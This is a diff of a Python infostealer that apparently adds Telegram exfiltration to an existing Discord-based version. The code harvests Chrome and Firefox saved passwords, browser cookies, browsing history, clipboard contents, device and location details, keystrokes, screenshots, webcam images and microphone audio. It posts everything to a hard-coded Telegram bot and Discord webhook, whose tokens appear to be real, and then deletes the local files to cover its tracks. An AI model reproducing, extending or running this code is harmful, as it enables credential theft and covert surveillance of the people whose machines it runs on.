@@ -5,60 +5,94 @@ import requests
 import base64
 import shutil
 import pyperclip
-from datetime import datetime, timedelta
-import win32crypt  # Windows only (for Chrome passwords)
-from Crypto.Cipher import AES  # For Chrome password decryption
-import browser_cookie3  # For cookies
+from datetime import datetime
+import win32crypt  # Windows only
+from Crypto.Cipher import AES
+import browser_cookie3
 import glob
-import csv
-import time
+import platform
+import socket
+import uuid
+import geocoder
 from PIL import ImageGrab
 import cv2
 import sounddevice as sd
 import numpy as np
 import scipy.io.wavfile as wav
 from pynput import keyboard
-import threading
+import time
 
-# Configuration
-WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"
+# ===== CONFIGURATION =====
+TELEGRAM_BOT_TOKEN = "7981924217:AAH58pNcgI33TbOrxUingXTG2nfQa_idWps"
+TELEGRAM_CHAT_ID = "6558780822"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1415295319025123418/J_d1zg0WR8s6PNHFf22qvazZEVAR_cJQCjJqzrYeTMpKv_znl8rVEmaacXxklj4WfbJi"
 LOG_FILE = "keylogs.txt"
 RECORD_DURATION = 10  # Seconds for audio recording
 
-# ===== Keylogger =====
-def on_press(key):
+# ===== TELEGRAM UTILS =====
+def send_to_telegram(text, file_path=None):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    if file_path:
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+        with open(file_path, "rb") as f:
+            files = {"document": f}
+            data = {"chat_id": TELEGRAM_CHAT_ID, "caption": text}
+            requests.post(url, files=files, data=data)
+    else:
+        data = {"chat_id": TELEGRAM_CHAT_ID, "text": text}
+        requests.post(url, json=data)
+
+# ===== DEVICE & LOCATION =====
+def get_device_info():
     try:
-        with open(LOG_FILE, "a") as f:
-            f.write(f"{key.char}")
-    except AttributeError:
-        with open(LOG_FILE, "a") as f:
-            f.write(f"[{key}]")
+        return {
+            "OS": f"{platform.system()} {platform.release()}",
+            "Hostname": socket.gethostname(),
+            "MAC": ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8*6, 8)][::-1]),
+            "IP": socket.gethostbyname(socket.gethostname()),
+            "User": os.getlogin(),
+            "CPU": platform.processor(),
+            "Timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+    except Exception as e:
+        return {"Error": str(e)}
 
-def start_keylogger():
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    return listener
+def get_location():
+    try:
+        g = geocoder.ip('me')
+        return {
+            "City": g.city,
+            "Country": g.country,
+            "Coordinates": g.latlng,
+            "IP": g.ip
+        }
+    except:
+        return {"Error": "Location unavailable"}
 
-# ===== Browser Data Extraction =====
+# ===== BROWSER DATA =====
+def get_browser_data():
+    return {
+        "Chrome_Passwords": get_chrome_passwords(),
+        "Firefox_Passwords": get_firefox_passwords(),
+        "Cookies": get_browser_cookies(),
+        "History": get_browser_history()
+    }
+
 def get_chrome_passwords():
     try:
-        # Path to Chrome's Login Data (Windows)
         if os.name == 'nt':
             path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
-        else:  # Linux/Mac
+        else:
             path = os.path.expanduser("~/.config/google-chrome/Default/Login Data")
 
-        # Copy the file to avoid DB lock
         temp_file = "chrome_passwords.db"
         shutil.copy2(path, temp_file)
 
-        # Connect to SQLite DB
         conn = sqlite3.connect(temp_file)
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
         passwords = []
 
-        # Decrypt passwords (Windows only)
         for row in cursor.fetchall():
             url, username, encrypted_password = row
             if os.name == 'nt' and encrypted_password:
@@ -81,7 +115,6 @@ def get_chrome_passwords():
 
 def get_firefox_passwords():
     try:
-        # Firefox passwords are stored in key4.db and logins.json (Windows/Linux/Mac)
         if os.name == 'nt':
             path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
         else:
@@ -106,7 +139,7 @@ def get_firefox_passwords():
 def get_browser_cookies():
     try:
         cookies = []
-        for browser in ["chrome", "firefox", "edge","opera","brave"]:
+        for browser in ["chrome", "firefox", "edge", "opera", "brave"]:
             try:
                 for cookie in browser_cookie3.load(browser):
                     cookies.append({
@@ -148,29 +181,23 @@ def get_browser_history():
     except:
         return []
 
-# ===== System Data (Screenshot, Webcam, Audio) =====
+# ===== SYSTEM MONITORING =====
 def capture_screen():
     try:
-        screenshot = ImageGrab.grab()
-        screenshot.save("screenshot.png")
-        with open("screenshot.png", "rb") as f:
-            return base64.b64encode(f.read()).decode("utf-8")
+        ImageGrab.grab().save("screenshot.png")
+        return "screenshot.png"
     except:
         return None
 
-def capture_camera():
+def capture_webcam():
     try:
         cam = cv2.VideoCapture(0)
-        result, image = cam.read()
-        if result:
-            cv2.imwrite("webcam.png", image)
-            with open("webcam.png", "rb") as f:
-                return base64.b64encode(f.read()).decode("utf-8")
+        _, frame = cam.read()
+        cv2.imwrite("webcam.png", frame)
+        cam.release()
+        return "webcam.png"
     except:
         return None
-    finally:
-        if 'cam' in locals():
-            cam.release()
 
 def record_audio():
     try:
@@ -178,52 +205,84 @@ def record_audio():
         recording = sd.rec(int(RECORD_DURATION * fs), samplerate=fs, channels=2)
         sd.wait()
         wav.write("recording.wav", fs, recording)
-        with open("recording.wav", "rb") as f:
-            return base64.b64encode(f.read()).decode("utf-8")
+        return "recording.wav"
     except:
         return None
 
-# ===== Send Data to Discord =====
+# ===== KEYLOGGER =====
+def on_press(key):
+    try:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(LOG_FILE, "a") as f:
+            f.write(f"[{key}]")
+
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
+    return listener
+
+# ===== DISCORD UTILS =====
 def send_to_discord():
     data = {
-        "Browser_Passwords": {
-            "Chrome": get_chrome_passwords(),
-            "Firefox": get_firefox_passwords(),
-        },
-        "Browser_Cookies": get_browser_cookies(),
-        "Browser_History": get_browser_history(),
-        "System_Info": {
-            "Username": os.getlogin(),
-            "Clipboard": pyperclip.paste(),
-        }
+        "Device_Info": get_device_info(),
+        "Location": get_location(),
+        "Browser_Data": get_browser_data(),
+        "Clipboard": pyperclip.paste()
     }
-
     files = {
-        "file1": ("screenshot.png", base64.b64decode(capture_screen() or "")),
-        "file2": ("webcam.png", base64.b64decode(capture_camera() or "")),
-        "file3": ("recording.wav", base64.b64decode(record_audio() or "")),
-        "file4": ("keylogs.txt", open(LOG_FILE, "rb").read()),
+        "file1": ("screenshot.png", open("screenshot.png", "rb").read()) if os.path.exists("screenshot.png") else None,
+        "file2": ("webcam.png", open("webcam.png", "rb").read()) if os.path.exists("webcam.png") else None,
+        "file3": ("recording.wav", open("recording.wav", "rb").read()) if os.path.exists("recording.wav") else None,
+        "file4": ("keylogs.txt", open(LOG_FILE, "rb").read()) if os.path.exists(LOG_FILE) else None,
     }
+    files = {k: v for k, v in files.items() if v is not None}
+    requests.post(WEBHOOK_URL, files=files, data={"payload_json": json.dumps(data)})
 
-    requests.post((constant)WEBHOOK_URL: Literal['https://discord.com/api/webhooks/1415295319025123418/J_d1zg0WR8s6PNHFf22qvazZEVAR_cJQCjJqzrYeTMpKv_znl8rVEmaacXxklj4WfbJi'], files=files, data={"payload_json": json.dumps(data)})
-
-# ===== Main Execution =====
+# ===== MAIN EXECUTION =====
 if __name__ == "__main__":
     keylogger = start_keylogger()
     time.sleep(30)  # Collect data for 30 seconds
     keylogger.stop()
+
+    # Collect data
+    device_info = get_device_info()
+    location = get_location()
+    browser_data = get_browser_data()
+    screenshot = capture_screen()
+    webcam = capture_webcam()
+    audio = record_audio()
+
+    # Format report for Telegram
+    report = f"""
+    📡 **Device Info**:
+    ```json
+    {json.dumps(device_info, indent=2)}
+    ```
+    
+    🌍 **Location**:
+    ```json
+    {json.dumps(location, indent=2)}
+    ```
+    
+    🔑 **Browser Data**:
+    ```json
+    {json.dumps(browser_data, indent=2)}
+    ```
+    """
+
+    # Send to Telegram
+    send_to_telegram(report)
+    if screenshot: send_to_telegram("📸 Screenshot", screenshot)
+    if webcam: send_to_telegram("🎥 Webcam Capture", webcam)
+    if audio: send_to_telegram("🎤 Audio Recording", audio)
+    if os.path.exists(LOG_FILE): send_to_telegram("⌨️ Keylogs", LOG_FILE)
+
+    # Send to Discord (optional)
     send_to_discord()
-    if os.path.exists(LOG_FILE):
-        os.remove(LOG_FILE) # Clean up log file
-    if os.path.exists("screenshot.png"):
-        os.remove("screenshot.png")
-    if os.path.exists("webcam.png"):
-        os.remove("webcam.png")
-    if os.path.exists("recording.wav"):
-        os.remove("recording.wav")
-    if os.path.exists("chrome_passwords.db"):
-        os.remove("chrome_passwords.db")
-    if os.path.exists("chrome_history.db"):
-        os.remove("chrome_history.db")
-    if os.path.exists("keylogs.txt"):
-        os.remove("keylogs.txt")
+
+    # Cleanup
+    for file in ["screenshot.png", "webcam.png", "recording.wav", "chrome_passwords.db", "chrome_history.db", LOG_FILE]:
+        if os.path.exists(file):
+            os.remove(file)
